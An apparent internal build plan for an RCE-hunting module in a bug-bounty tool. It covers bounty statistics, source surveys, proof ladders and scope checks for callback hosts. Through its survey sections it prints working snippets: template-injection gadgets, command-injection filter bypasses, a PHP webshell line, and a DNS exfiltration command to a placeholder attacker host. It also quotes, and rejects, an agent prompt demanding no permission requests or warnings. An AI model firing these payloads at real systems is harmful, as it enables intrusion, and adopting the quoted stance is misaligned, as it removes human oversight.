# Build plan — `hunt-rce`

Remote code execution hunting for BugVault.
Drafted 2026-11-21. Target branch `recon-engine`. Baseline: 24 routed classes,
22 entries in `catalog.HUNT_SKILLS`, 30 skill directories.
No class, skill, module or test for RCE, command injection or deserialization
exists today.

---

## 1. Corpus position

From `vault/_data/reports-merged.csv` (15,443 rows, column `class`):

| Metric | `rce` | corpus |
|---|---|---|
| Reports | **650** (4.2%) | 15,443 |
| Bounty rate | 42% | 42% |
| Priced rows | 153 | 3,552 |
| Median | $1,000 | $500 |
| **Mean** | **$3,696** | $1,554 |
| **p90** | **$10,000** | $3,500 |
| Max | $33,510 | $50,000 |

Mean is **2.4×** the corpus; p90 is **2.9×**. Against every other class measured:

| Class | Rows | Mean | p90 |
|---|---|---|---|
| **rce** | 650 | **$3,696** | **$10,000** |
| sqli | 317 | $2,122 | $5,000 |
| idor-bola | 1,216 | $1,963 | $4,500 |
| ssrf | 297 | $1,839 | $4,500 |
| xxe | 38 | $1,600 | $6,000 |
| file-upload | 14 | $1,550 | $5,000 |

Highest mean and highest p90 of any class in the vault. Severity mix of the 405
classified rows: **critical 157, high 111**, medium 81, low 43, none 13 — 66%
critical-or-high.

### The number that decides the architecture

**`ssti` has 0 rows. `file-upload` has 14.**

Those classes exist in our engine and are actively hunted, but the corpus does not
label their outcomes under their own name — it labels them `rce`. The 650 `rce` rows
absorb SSTI entirely and most upload-to-execution. Compare BugBountySkills' own index
of 495 RCE report IDs, whose sub-type split is *General 237, File Upload RCE 122,
Command Injection 93, Deserialization 24, Code Injection 11, SSTI 2*.

RCE is not a surface. It is the **label applied to several surfaces' terminal
outcome**. Build it that way.

---

## 2. Organizing thesis — a convergence class, not a scan class

You do not scan for RCE. You arrive at it, from SSTI, from an upload, from a
deserialization sink, from argument injection into a subprocess, or from a known CVE.

A seeded class produces one coverage row per `(asset_id, bug_class)`. Seeding `rce`
that way would assert "this asset has an RCE surface" for every asset in scope, which
is not a fact about anything. The seeded unit must be the **sink**, and the arrival
state must be a **fact on an existing ledger**.

So: two new seeded classes for the two sinks that have no home, and `hunt-rce` as a
convergence skill that owns the proof contract shared across all paths.

---

## 3. The engine already models execution

This is the single most important finding of the survey, and it is load-bearing for
everything below.

**`recon/upload.py:120`**

```python
FACTS = ("accepted", "stored", "reachable", "processed", "served", "executed", "effect")
```

Seven separately-evidenced facts, `executed` among them, with hand-written guards
against exactly the over-claim RCE invites:

- `:152` "acceptance is not code execution"
- `:191` "a derivative or job record proves processing only, not an unsafe parser or
  command execution"
- `:216` "static bytes or an attachment do not show execution"
- `:128` case grants already include `"execution"`

**`recon/ssti.py:60`**

```python
DEPTH_GRANTS = ("context", "file-read", "execution")
ESCALATION = {"token-use": ("execution", "critical"), "lateral": ("execution", "critical")}
```

with `:556` guarding that "execution or severity inference" does **not** follow from
arithmetic evaluation.

**`recon/chain.py`** — one of the nine `STEP_CHAINS` is `ssti-exec`.

**`recon/findings.py:5-11`** — the lifecycle is already stricter than anything the
surveyed sources propose:

```
lead -> confirmed -> impact-proven -> reported -> accepted | duplicate | informative | n-a

lead -> confirmed           needs a replay artifact AND a negative-control artifact
confirmed -> impact-proven  needs an impact artifact (what an attacker actually gets)
```

Two modules independently hand-write the same rule in different words. `hunt-rce`'s
first job is to replace both with one contract.

---

## 4. Sub-class map — what has a home

mind-hunt's seven priority sub-classes against our 24 routed classes:

| mind-hunt sub-class | Our engine | Action |
|---|---|---|
| Server-side template injection | `ssti` → `hunt-ssti`, execution depth grant, `ssti-exec` chain | extend |
| Webshell upload | `file-upload` → `executed` fact | extend |
| Command injection in media processors | upload leg only; no cmdi class | **new class** |
| Shell injection in subprocess calls | none | **new class** |
| Unsafe deserialization | none | **new class** |
| Direct eval sinks | partially reachable via `js-bundle` static reads | fold into cmdi |
| CI/CD pivot | none | fold into `cloud-misconfiguration` |

Two new seeded classes: **`deserialization`** and **`command-injection`**.

---

## 5. The five sources occupy five different layers

Unusually for this effort, the sources are complementary rather than overlapping.
Each owns one layer and is weak-to-empty on the others.

| Layer | Source | Owns |
|---|---|---|
| Technique depth | **HackTricks** | 186 KB deserialization; three sinks nobody else has |
| Payload precision | **BugBountySkills `SKILL_FILES/`** | engine disambiguator, filter-bypass ladders, .NET marker |
| Routing and triage | **mind-hunt** | sub-classes ranked by disclosed frequency, bounty calibration |
| Proof mechanics | **ARTEX** | PoE ladder, evidence roles, machine-checked verification |
| Execution mechanics | **PentAGI** | time oracle, detach rule, callback preconditions |

Take all five. Taking any one alone produces a skill that is strong in one dimension
and blind in four.

---

## 6. mind-hunt — `hunt-rce/SKILL.md`, 102 lines

SHA-256 `cff36310133626926bd0041e35f92611...`

Thin by mind-hunt's standards (`hunt-race-condition` is 461 lines, `cloud-iam-deep`
521). It is a **router**, and should be read as one.

| Take | Anchor |
|---|---|
| Seven sub-classes ranked by disclosed-report frequency | L10-18 |
| **Disclosed bounty table with live report IDs** | L20-31 |
| SSTI arithmetic canaries, per-engine escalation | L34-48 |
| Deserialization magic markers | L50-53 |
| Media-processor vectors | L55-59 |
| Eval-sink grep set | L61-70 |
| **WAF canary discipline** | L89 |
| **Container-impact caveat** | L87 |
| Chain-up ladder | L91-96 |

Its two best lines are not technique, they are judgement:

> Mass blind SSTI scanning trips WAFs. Send 1-2 careful canaries per param, not a
> wordlist. — L89

> "RCE" in a Docker container with no internet ≠ Crit if the container has no
> DB/secrets. Demonstrate file read of `/etc/passwd` AND environment dump for full
> impact. — L87

The bounty table is the calibration anchor: Shellshock #29839 $20,000, Pornhub
phpobject-in-cookie #141956 $20,000, shopify-scripts mruby type confusion #181879
$18,000, Pornhub unserialize→XXE #142562 $10,000, Uber Flask Jinja2 #125980 $10,000,
Imgur `gm convert` arg injection #212696 $5,000, Snapchat test Jenkins #258117 $5,000.

Also L88: Flask `debug=True` PIN-protected console is solvable by PIN derivation
(`mac` + `username` + `modname` + `appname` + `moddir`). Absent from every other
source.

---

## 7. HackTricks — the depth, and it is the deepest set in this effort

`pentesting-web/deserialization/` is **186 KB across 11 files**, larger than the
smuggling set (~100 KB) that previously held the record.

| File | Size | mind-hunt |
|---|---|---|
| `README.md` | 49 KB | partial |
| **`jndi-java-naming-and-directory-interface-and-log4shell.md`** | 35 KB | **absent** |
| **`exploiting-__viewstate-knowing-the-secret.md`** | 22 KB | **absent** |
| **`java-jsf-viewstate-.faces-deserialization.md`** | 19 KB | **absent** |
| **`exploiting-__viewstate-parameter.md`** | 14 KB | **absent** |
| **`java-dns-deserialization-and-gadgetprobe.md`** | 12 KB | **absent** |
| `basic-.net-deserialization-objectdataprovider-...-json.net.md` | 11.5 KB | absent |
| `java-transformers-to-rutime-exec-payload.md` | 11 KB | absent |
| `python-yaml-deserialization.md` | 8 KB | absent |
| `basic-java-deserialization-objectinputstream-readobject.md` | 6.7 KB | partial |
| `nodejs-proto-prototype-pollution/` | dir | absent |

The high-value omissions are **JNDI/Log4Shell**, **ASP.NET `__VIEWSTATE`** (two files,
37 KB), **JSF `.faces` ViewState**, and **GadgetProbe/DNS blind detection**. ViewState
in particular is a large real-world surface that mind-hunt does not mention once.

### Three execution sinks absent from every other source

| File | Size |
|---|---|
| `xslt-server-side-injection-...-transformations.md` | 16.6 KB |
| `server-side-inclusion-edge-side-inclusion-injection.md` | 12.9 KB |
| `formula-doc-latex-injection.md` | 12 KB |

XSLT, SSI/ESI and formula/LaTeX injection all reach code execution. None appear in
mind-hunt, ARTEX, PentAGI or BugBountySkills' real content. Plus
`command-injection.md` (7.9 KB) for the base case.

Pack order for the generator model: `command-injection.md` first (smallest, highest
hit rate), then `deserialization/README.md`, then the per-technology files on demand.
The full deserialization directory does not fit one context.

---

## 8. BugBountySkills — one lineage real, one hollow

**`KNOWLEDGE_BASE/` is hollow and now proven so.** Files of the same name across
unrelated classes are near-identical: `SSTI/bypasses.md` vs `XXE/bypasses.md` are
121 lines each with **12 changed line-pairs**. `hunting-methodology.md` 90 lines,
6 changed pairs. `tools.md` 134 lines, 11 changed pairs.

The RCE folder specifically:

- `payloads.md` — nine "payloads" are regex-scraped tokens: `` `curl ``, `` `Curl ``,
  `` `CURL ``, `` `cURL `` (four case variants of one word with a stray backtick),
  `child_process`, `subprocess.Popen`, `exec(`. Not one executable payload.
- `bypasses.md` — all five "bypasses" are the same `%252e%252e%252f`, which is
  double-encoded path traversal and not an RCE bypass at all.
- `theory.md` — the root-cause prose is **XSS boilerplate pasted into an RCE file**
  ("render in a JavaScript attribute or DOM sink", "React/Vue dangerouslySet").
- `README.md` — contains a leaked un-rendered Python ternary:
  `$4,323 — [Report #3031518](...) if 495 > 0 else 'N/A'`. Advertises "13 distinct
  scenarios"; the file has 7. `avg_bounty: 411` is computed from **17 of 495 rows**
  (3.4% sample) and presented as corpus-wide.

Metadata remains worthless as a quality signal, confirming the earlier
`API_Security`-at-409-reports finding. Skip the whole directory.

**`SKILL_FILES/` is real** — terse operator notes with working payloads, authored once
as string literals in `scripts/gen_vuln_web.py` and `scripts/gen_scripting_payloads.py`
rather than templated. Condensed PayloadsAllTheThings / HackTricks / GTFOBins. Not
novel, but accurate and dense. First non-hollow material found in this repo across
eleven classes.

### The six files worth harvesting

**`ssti_all_engines.md` (134) + `ssti_payloads_all_engines.md` (120)** — the strongest
single delta in the whole survey:

> `{{7*'7'}}` → **Twig returns `49`, Jinja2 returns `7777777`**

mind-hunt's `{{7*7}}` cannot separate Jinja2 from Twig; both return `49`. One
character fixes a real hole in the fingerprint step. Also carries Smarty (including
`Smarty_Internal_Write_File::writeFile` webshell drop), ERB, Handlebars (full
`{{#with "s" as |string|}}` constructor chain), Pug/Jade, Razor, Mako, Tornado,
Thymeleaf, Pebble, Spring SpEL — engines mind-hunt has no payloads for.

Modern short Jinja2 gadgets that skip the fragile `__subclasses__()` index-hunting
mind-hunt instructs:

```
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen(...)}}
```

Filter-bypass ladder: `attr` with hex-escaped dunders
(`attr('\x5f\x5fglobals\x5f\x5f')`), quoteless `request|attr(request.args.attr)`
with `?attr=__class__`, and `[]` when dots are stripped.

**`deserialization_payloads.md` (88) + `deserialization_all_langs.md` (83)**:

- **.NET `AAEAAA` base64 marker** — completes the marker set; mind-hunt has no .NET.
- **`URLDNS` chain for silent blind confirmation before firing RCE** — a
  detection-first move no other source names.
- Concrete generators where mind-hunt only names tools: Python `__reduce__`, PyYAML
  `!!python/object/apply:os.system`, Ruby ERB `marshal_dump`,
  `phpggc Symfony/RCE4 system id -b`, node-serialize `_$$ND_FUNC$$_`.
- **JEP 290** allow-list caveat and bypass direction.

**`rce_all_vectors.md` (110) + `rce_payloads_all_langs.md` (132)** — a
command-injection filter-bypass ladder with no equivalent anywhere else:

| Filter | Bypass |
|---|---|
| space | `{cat,/etc/passwd}`, `cat$IFS$9/...`, `cat<>/...` |
| `cat` blacklisted | `tac`, `nl`, `c\at`, `'c'a't'`, `c?t` |
| slash | `${PATH:0:1}` |
| alphanumeric | `${0##*/}`, Bashfuck |
| length-limited | base64 staging |

Plus the no-output exfil primitive — `nslookup $(whoami).attacker.tld` — where
mind-hunt only says "use Collaborator" and gives no in-command trick. Also XSLT RCE
(`<xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>` on
Saxon/Xalan), Shellshock header, `docker.sock` escape, commix.

**`file_upload_bypass.md` (105)** — mind-hunt's webshell line is a stub; this is a
working ladder: extension permutations (`.phtml`/`.phar`/`.pht`, `%00`, `;.jpg`, NTFS
`:`, trailing dot), `GIF89a;<?php system($_GET['c']); ?>`, **`.htaccess`
`AddType application/x-httpd-php .pwn`**, IIS `web.config` handler override, Zip-slip,
phar-polyglot→unserialize. Feeds `hunt-file-upload`, not `hunt-rce`.

**`scr_ci_cd_pipeline_review.md` (44)** — the modern CI/CD surface against
mind-hunt's one bullet about exposed Jenkins: `pull_request_target` with `head.sha`
checkout running fork code **with secrets**, `${{ github.event.issue.title }}` step
injection, `::set-output` injection, cache poisoning, non-ephemeral self-hosted
runners. Tools gato, raven, `semgrep p/github-actions`.

### The report index

`KNOWLEDGE_BASE/RCE/reports-index.md` — 583 lines, **495 unique HackerOne IDs** in a
parseable table. Usable as a seed list only: titles are truncated with ellipsis, the
`Quality` column is the constant `9` for all 495 rows, sub-type labels are frequently
wrong (curl buffer overflows tagged `File Upload RCE`), 48% land in an unclassified
`General` bucket, and ~53 rows are non-webapp memory-safety padding with placeholder
programs (`localhost`, `malicious-server.com`, `Unknown Program`). For SSTI it yields
**2 reports**. Take the IDs, re-scrape the titles.

### Do not vendor `REFERENCE/source_pdfs_text/`

Full-text dumps of copyrighted books — WAHH (2.8 MB), *The Tangled Web* (948 KB),
*Bug Bounty Bootcamp*, *Black Hat Python*. Licensing hazard. Excluded.

---

## 9. ARTEX — proof mechanics, and the best structural find in the survey

Almost nothing on technique (see §17 zeros). A great deal on how you know you have it.

### The PoE ladder

`server/orchestration.go:457`, verbatim:

> `1 error/timing/response variation, 2 structural manipulation, 3 actual data
> extracted, 4 critical impact. L3 is the minimum for verified.`

That is the blind-versus-direct distinction expressed as a number. mind-hunt has no
proof scale at all — nothing between "`49` reflected" and "I have RCE".

### Machine-checked verification

`finding_verification.go:21-31`, `:140-197`. "Verified" requires:

1. a bound traffic record with role `proof` or `verification`,
2. a declared PoE **≥ 3**,
3. at least one evidence quote of **≥ 8 runes** found **verbatim**
   (whitespace-normalized) in that bound response body.

Fail-closed: verdict `not_assessed` for non-text bodies, unreadable bodies, or bodies
beyond 4 MiB — it refuses to call a binary body a match. `:47-52` decodes
gzip/deflate/zlib first and **errors on unknown or stacked codings rather than
falling back to raw bytes**.

This is anti-self-deception machinery for precisely the claim "I got RCE".

### Four evidence roles as a schema

`docs/vulnerability-traffic-evidence.md:24`, `web/src/lib/types.ts:1692`:

| Role | Meaning |
|---|---|
| `baseline` | the normal control |
| `proof` | the triggering request |
| `verification` | an **independent second confirmation** |
| `supporting` | everything else |

The negative-control slot is a **first-class field, not advice**. Our
`lead -> confirmed` already demands a replay artifact and a distinct negative-control
artifact; ARTEX turns that rule into a typed role. Adopt the typing.

### The worked blind→direct pattern

`web/src/lib/mock/handler.ts:68-103` is demo data but it is the canonical shape, and
the only place in ARTEX that pairs a blind trigger with independent confirmation:

- `proof` — Fastjson `@type:JdbcRowSetImpl` JNDI payload whose response is only
  `{"status":"error"}`. Blind. No output.
- `verification` — a **separate** request `{"cmd":"id"}` → `uid=33(www-data)`.

Two bindings, one finding. That is exactly the shape `finding_verification.go`
requires, and exactly what a deserialization case needs.

### The execution-primitive inventory

`intercept/alwaysallow_denylist.go:16-44` — ~150 programs grouped by mechanism. The
"launchers: run their arguments (or a flag's value) as a command" group:

```
env command exec eval source nohup timeout nice setsid chroot unshare nsenter
systemd-run sudo pkexec watch busybox xargs parallel make trap script find ssh
rsync socat nc flock strace gdb tar zip vim less more man awk sed
```

mind-hunt's gm/ffmpeg/ImageMagick list is a tiny subset of this. **`find`, `tar`,
`zip`, `less`, `man`, `awk` as argument-injection gadgets are absent from it
entirely.** `:49-64` adds a normalization recipe worth copying: basename, lowercase,
strip trailing version digits (`php8.2` → `php`, `mkfs.*` → `mkfs`).

`README.md:249-255` names the metacharacter classes for command matching: "Pipes,
lists, redirections, prefix assignments, subshells, background jobs, wrapper programs
and command/parameter substitutions" — plus the concrete bypass fact that an argv
prefix rule covering `git push --force` matches nothing on `git -C /repo push`.

### `php2shell` — LFI→RCE, not upload→webshell

Worth stating plainly because the name misleads. It upgrades an **existing LFI
finding** into RCE using PHP's own session file as the write primitive.

- **Inputs** (`skills/php2shell/SKILL.md:38-43`): an LFI/unsafe-include finding with
  its path-parameter constraints recorded (prefix/suffix, truncation, wrapper
  filters), plus a passively fingerprinted PHP 5.4.0–8.5.11 with
  `session.upload_progress.enabled=On` (the default).
- **Mechanism** (`:44-46`): an in-flight multipart POST carrying
  `PHP_SESSION_UPLOAD_PROGRESS` and an attacker-chosen `PHPSESSID` **in the POST
  body** — bypassing `use_only_cookies` — makes PHP write a session file containing
  the **raw, unvalidated filename**. The payload goes in the *filename*, not the
  content.
- **Timing is a required step** (`:47-48`): race the session file's lifetime, either
  including it through the LFI while the upload is still in flight or holding the
  connection open. Our webshell path has no timing dimension at all.
- **Proof** (`:49-50`, `:32-34`): "Verify RCE with a single marker command; record the
  request sequence as evidence." Then: "prove execution once (a marker echo), capture
  evidence, stop. No persistence, no further exploration through the shell."
- **Negative disposition** (`:52-55`): no LFI primitive → "the configuration is
  hardening-relevant, not exploitable. Report posture only."

`scripts/poc/php2shell/poc/verify_session_injection.py:73-101` probes with a **benign
control first** — a normal filename expecting `s:10:"normal.txt"` — before the code
payload, verifying the write primitive landed independently of execution.
`lab/setup.sh:25-61` is an offline fixture whose `php.ini` list
(`use_only_cookies=0`, `upload_progress.enabled=On`, `cleanup=Off`, `freq=1%`,
`min_freq=0`) doubles as a config-fingerprint checklist.

### LAB-ONLY sub-chain tiering

`skills/php2shell/SKILL.md:29-31` — chains 2 (var_destroy UAF) and 3 (serializer
mismatch) are marked lab-only:

> never fire memory-corruption or serializer-confusion primitives at a remote target.
> Detection of their preconditions is fine.

A clean per-sub-chain split between *detect* and *exploit*. Adopt this directly;
several deserialization gadget chains belong on the detect side.

`scripts/poc/php2shell/docs/ANALYSIS.md:19-67` labels each chain
**Conditions / Complexity / Reliability / Verified** (A: low, 100%; B: medium, ~60%
heap-dependent; C: medium, high), with the Verified line naming the observed
artifact. Reusable schema for RCE sub-chains.

And a general deserialization fact from `:65` that is genuinely non-obvious:

> `__destruct` fires on **both** the success and failure paths, so "The decode FAILURE
> does NOT prevent exploitation."

Do not abandon a gadget because the deserializer errored.

### Reporting gates

- `agent/retester.go:8-11` — three-verdict retest with a control in the bar for
  "fixed": the original trigger must stop working **and** "a normal control still
  works". "A single failed or unmatched request does not prove the finding is fixed" —
  WAF block, expired login and tool gap all map to `inconclusive`.
- `scripts/submission_review/README.md:8-12` — seven named pre-submission checks, of
  which **`poc_remote`** matters most here: "remote attacker over HTTP, not
  server-side access". That disqualifies a PoC proven only from a shell you already
  hold, which is the classic RCE write-up trap.
- `skills/php2shell/SKILL.md:13-21` — patch-recency policy: programs often exclude
  recently-patched third-party issues within ~14 days of patch release, so the finding
  is often "reportable, not payable".
- `agent/promptcatalog.go:116-133` — `## Measured impact` as a section **distinct
  from** `## Impact`; `:131` "One finding per report, no collapsing: additional
  locations of the same root cause are listed inside it."

### Static sink-hunting phases

`skills/codeaudit/SKILL.md` is ARTEX's only real phase model and it is better than
`grep eval\(`:

- `:24-37` — never stop at an abstraction boundary (a router/dispatcher is a fork into
  N traces); run a **transitive caller search** on every candidate sink, callers of
  callers to entry points; follow through DB/cache/queue stores. "An input used in
  three places is three traces; a safe path never clears the other paths." `:37`
  "search output navigates, source read judges."
- `:54-58` — static-trace PoC minimum: concrete input at entry, `file:line` at every
  propagation step, the literal dangerous value reaching the sink, concrete impact —
  labeled **`static-analysis-unexecuted`** and marked *potential*.
- `:62-64` — per-root-cause whole-codebase sweep. "Silent drops are audit failures."

That `static-analysis-unexecuted` label is exactly the state a `js-bundle` eval-sink
hit should land in.

---

## 10. PentAGI — execution mechanics

Second of eleven classes where this repo has contributed anything. Its yield is
orchestration, not vulnerability knowledge.

### The time oracle — fills our biggest detection gap

`examples/prompts/base_web_pentest.md:35-40` gives the blackbox command-injection
oracle: **time-based detection as the primary signal**, with `${IFS}sleep${IFS}10` and
backtick `` `sleep 10` `` as space-filter bypasses, plus commix.

mind-hunt has no time oracle — it treats command injection as source-code sinks only.
For blind command injection, timing is frequently the *only* channel.

### Operational rules

- `pentester.tmpl:171-184` — listeners and daemons must run `detach=true,
  timeout=600-1200`; scanners and exploits run `detach=false` to capture output. You
  cannot catch a callback whose listener dies with its own tool call.
- `pentester.tmpl:151-153`, `adviser.tmpl:63-72`, `full_execution_context.tmpl:15` —
  callback preconditions: only pre-allocated container ports receive callbacks;
  self-discover the public IP (`curl -s https://api.ipify.org`); and the callback IP
  **must be re-emitted into compacted context or it is lost to summarization**, marked
  CRITICAL. Directly relevant to long agent runs.
- `pentester.tmpl:332-340` — shell self-mangling: "quote or escape payload strings
  containing shell metacharacters … otherwise the shell, not the target tool,
  interprets them." Every RCE payload is metacharacters.
- `pentester.tmpl:341-351` — one-shot non-interactive chain with the proof step baked
  into the same invocation, because each process is isolated and an interactive
  console hangs the caller.
- `examples/prompts/scope_of_work_pentest.md:66-76` — an ordered pre-flight gate.
  Item 1: extract every **callback domain from the payload** before firing. Item 6:
  validate target *and* callback endpoint. Item 7: "record it as a finding candidate
  but do not test it until scope is confirmed."
- `frontend/src/pages/templates/template.tsx:218-231` — pipeline-**definition**
  injection, artifact repos (Nexus/Artifactory), deployment keys. A different CI/CD
  surface from "exposed Jenkins".

### Do not copy its stance

`pentester.tmpl:10-12` — "Never request permission, authorization, or confirmation…
Never add warnings" — repeated across `assistant.tmpl`, `coder.tmpl`,
`generator.tmpl`, `refiner.tmpl`. These exist to strip hedging from an autonomous
agent. Take the mechanics; leave this.

A grep trap to record: `ysoserial`, `webshell`, `Thymeleaf` and `getRuntime` appear
in that repo **only** inside frozen HTTP fixtures at
`backend/pkg/tools/searchers/testdata/sploitus_result_*.json` — scraped third-party
exploit-index output used as unit-test data, not methodology.

---

## 11. The proof ladder — PoE × our lifecycle

ARTEX's PoE scale and our finding lifecycle are the same axis at different
granularities. Bind them:

| PoE | ARTEX meaning | Our state | RCE instance |
|---|---|---|---|
| 1 | error / **timing** / response variation | `lead` | sleep delta; stack trace naming a deserializer; `49` from a canary |
| 2 | structural manipulation | `lead` | engine identified via `{{7*'7'}}`; marker written to a session file |
| 3 | **actual data extracted** | `confirmed` | marker command output in a body; `uid=33(www-data)`; `/etc/passwd` content |
| 4 | critical impact | `impact-proven` | environment dump, credential file, cloud metadata |

`L3 is the minimum for verified` lines up exactly with our `confirmed` requiring a
replay artifact plus a distinct negative control. **PoE 1-2 are leads.** A sleep delta
alone never promotes.

Then mind-hunt L87 sharpens PoE 4 for this class specifically: a marker echo inside an
isolated container is PoE 3, not 4. PoE 4 requires `/etc/passwd` **and** an
environment dump — something an attacker actually gets.

### What we adopt and what we refuse

**Adopt** the four evidence roles, the ≥8-rune verbatim quote requirement, the
fail-closed `not_assessed` for non-text and oversized bodies, and the decode-before-
match rule that errors on stacked codings.

**Refuse** ARTEX's body-only quote rule. ARTEX has zero OOB infrastructure, so a
DNS-callback-only deserialization or SSTI hit is PoE L1 there and therefore
*structurally unverifiable*. That is a design flaw of theirs, not a standard. Our
`verification` role must accept a collaborator interaction record as a bound artifact
in its own right.

---

## 12. Two engine gaps that gate the build

### Gap 1 — no timing predicate

`recon/factcheck.py:19-22`:

```python
CHECKER_VERSION = "response-predicates-v1"
FIELDS = {"status_is": {"type", "expected"}, "header_present": {"type", "name"},
          "header_equals": {"type", "name", "expected"}, "body_contains_raw": {"type", "marker"}}
```

Four predicates, all response-content based, no negation. PoE L1 is defined as
"error/**timing**/response variation" and PentAGI's cmdi oracle is time-based — and
neither can be asserted today.

Needs a fifth predicate bound to stored response timing, something of the shape
`duration_exceeds {threshold_ms, baseline_request_id}`, evaluated against a recorded
baseline rather than an absolute. Checker version moves to
`response-and-timing-predicates-v2`.

Shipping `command-injection` before this means shipping a class that cannot evidence
its primary detection channel.

### Gap 2 — callback domains are never scope-checked

`collaborator` appears in `recon/brief.py`, `recon/catalog.py`, `recon/csrf.py` —
never in `recon/scope.py` or `recon/policy.py`.

PentAGI requires extracting every callback domain from the payload before firing and
validating the callback endpoint alongside the target. For this class that is not
hygiene: a JNDI or `URLDNS` payload **is** a callback URL, so the callback endpoint is
as much a scope object as the target host.

Needs `policy.callback_hosts` plus a check in the send path that refuses a payload
whose embedded callback domain is not declared.

---

## 13. Detection per sub-class

### SSTI — extends `hunt-ssti`

The engine already generates inert arithmetic controls and classifies raw evidence
per render surface. Two additions:

1. **The disambiguator.** `{{7*7}}` → 49 does not identify the engine. `{{7*'7'}}`
   does: Twig `49`, Jinja2 `7777777`. Record engine identity as a PoE 2 fact.
2. **Per-engine escalation** as a routed table rather than prose, with the modern
   short Jinja2 gadgets preferred over `__subclasses__()` index walking.

### Deserialization — new class, passively seeded

The marker set, complete:

| Marker | Runtime |
|---|---|
| `O:` | PHP serialize |
| `aced0005` / `rO0AB` | Java `ObjectOutputStream` (hex / base64) |
| `gASV` | Python pickle protocol 4 |
| `BAh` | Ruby Marshal (base64) |
| `AAEAAA` | .NET `BinaryFormatter` |
| `_$$ND_FUNC$$_` | node-serialize |
| `__VIEWSTATE` | ASP.NET ViewState |
| `javax.faces.ViewState` | JSF |

Every one of these is detectable in **captures we already hold** — cookies, query
parameters, POST bodies, hidden form fields. A seeder reading the existing store sends
zero traffic.

Confirmation order, detection-first:
1. Marker present → `lead`, PoE 1.
2. **`URLDNS` (Java) or an equivalent inert DNS-only chain** → callback observed
   proves the sink deserializes attacker bytes, still PoE 1-2, no code run.
3. Marker command with output → PoE 3, `confirmed`, with the two-binding shape from
   §9 (blind trigger as `proof`, independent output request as `verification`).

JEP 290 allow-listing and the `__destruct`-fires-on-failure fact belong in the blocker
table, not here.

### Command injection — new class, gated on Gap 1

Three detection channels, in order of what the engine can evidence:

1. **Direct output** — marker command echoed in the body. `body_contains_raw`. PoE 3.
2. **Timing** — `${IFS}sleep${IFS}10` against a recorded baseline. Needs the new
   predicate. PoE 1.
3. **DNS exfil** — `nslookup $(whoami).<callback>` encodes output into a hostname.
   Needs Gap 2 closed. PoE 3 when the label carries command output.

Argument injection is the under-covered half, and ARTEX's launcher inventory is the
map: any parameter reaching `find`, `tar`, `zip`, `awk`, `sed`, `less`, `man`, `ssh`,
`rsync`, `socat`, `make`, `xargs` is a candidate even with shell metacharacters fully
filtered, because the gadget runs its own arguments.

### Eval sinks — fold into `js-bundle`

`hunt-js-bundle` already reads bundles offline. An `eval(`, `new Function(`,
`child_process.exec`, `subprocess(..., shell=True)` or `Runtime.getRuntime().exec`
hit lands as `static-analysis-unexecuted` per ARTEX `codeaudit:54-58` — a *potential*
with a file:line trace, never a finding. Promotion requires a reached sink.

### CI/CD — fold into `cloud-misconfiguration`

`pull_request_target` with `head.sha` checkout, `${{ github.event.* }}` step
injection, non-ephemeral self-hosted runners, artifact-repo write. Static, repo-read
work; no new class.

---

## 14. Blockers and how each falls

| Blocker | What it does | How it falls |
|---|---|---|
| WAF on `{{` and `__class__` | canary never reaches the engine | unicode, HTML entity `&#123;&#123;`, inner spacing `{{ 7 * 7 }}`; then `attr()` with hex-escaped dunders; then quoteless `request\|attr(request.args.attr)` |
| Space filtered in cmdi | payload splits wrong | `${IFS}`, `{cat,/etc/passwd}`, `cat$IFS$9`, `cat<>file` |
| `cat` blacklisted | read blocked | `tac`, `nl`, `c\at`, `'c'a't'`, `c?t` |
| Slash filtered | no absolute paths | `${PATH:0:1}` |
| Alphanumerics filtered | nothing left to type | `${0##*/}`, Bashfuck |
| No output echoed | nothing to match | timing oracle (Gap 1); `nslookup $(cmd).<callback>`; `URLDNS` for deserialization |
| JEP 290 allow-list | Java gadget rejected | enumerate the allow-list from error behaviour; pivot to a listed class or a non-ObjectInputStream path (JNDI, ViewState, JSF) |
| Deserializer throws | looks like a dead end | `__destruct` fires on the failure path too — the decode error does not prevent exploitation |
| Length-limited field | payload won't fit | base64 staging, write-then-execute in two requests |
| Our own shell eats the payload | target never sees it | quote/escape before the call; PentAGI `:332-340` |
| Container with no secrets | RCE but low impact | mind-hunt L87 — `/etc/passwd` **and** environment dump; then chain to metadata |
| Flask debug PIN console | console locked | PIN derivation from `mac` + `username` + `modname` + `appname` + `moddir` |

---

## 15. Classes and seeding

Two new entries in `score.py`-independent, evidence-based seeders — the
`SEEDED_BY` pattern already used by `cloud.py`, `jsintel.py`, `jsledger.py`,
`takeover.py` and `pipeline.py`:

```python
SEEDED_BY["deserialization"]    = "deser.py"
SEEDED_BY["command-injection"]  = "cmdi.py"
```

```python
SKILLS_FOR_CLASS["deserialization"]   = ("hunt-deserialization", "hunt-rce")
SKILLS_FOR_CLASS["command-injection"] = ("hunt-command-injection", "hunt-rce")
```

`rce` itself is **not** seeded and **not** a coverage class. `hunt-rce` is reachable
from `deserialization`, `command-injection`, `ssti` and `file-upload`, and holds the
shared proof contract.

The three-way landing rule is enforced by **set equality**, not a count, so a skill
file without its catalog and skillmap entries fails immediately:

- `tests/test_recon_skills.py:105-106` — `{d.name for d in skill_dirs()}` must equal
  `{PHASES keys} | {HUNT_SKILLS keys}`
- `:112-113` — `{HUNT_SKILLS keys}` must equal `set(AUTH_SKILLS) | set(ORIGINAL_HUNT_SKILLS)`

Each new skill is therefore one atomic commit: directory, `catalog.HUNT_SKILLS` entry,
`ORIGINAL_HUNT_SKILLS` entry, and `skillmap` route together.

---

## 16. Implementation shape

### `recon/execproof.py` — the shared contract (build first)

Replaces the divergent hand-written guards at `upload.py:152` and `ssti.py:556`.

```
POE = (1, 2, 3, 4)                     # ARTEX orchestration.go:457
EVIDENCE_ROLES = ("baseline", "proof", "verification", "supporting")
MIN_QUOTE_RUNES = 8
MAX_BODY_BYTES  = 4 * 1024 * 1024
VERDICTS = ("verified", "potential", "not_assessed", "static-analysis-unexecuted")

def assess(finding, bindings) -> verdict
    # verified   requires role in (proof, verification) + poe >= 3
    #            + >=1 quote of >= MIN_QUOTE_RUNES verbatim in a bound artifact
    # not_assessed for non-text / unreadable / oversized bodies  (fail closed)
    # decode gzip/deflate/zlib first; error on unknown or stacked codings
```

Callers: `upload.py` (the `executed` fact), `ssti.py` (the `execution` depth grant),
`deser.py`, `cmdi.py`.

### `recon/deser.py` — passive seeder plus ledger

```
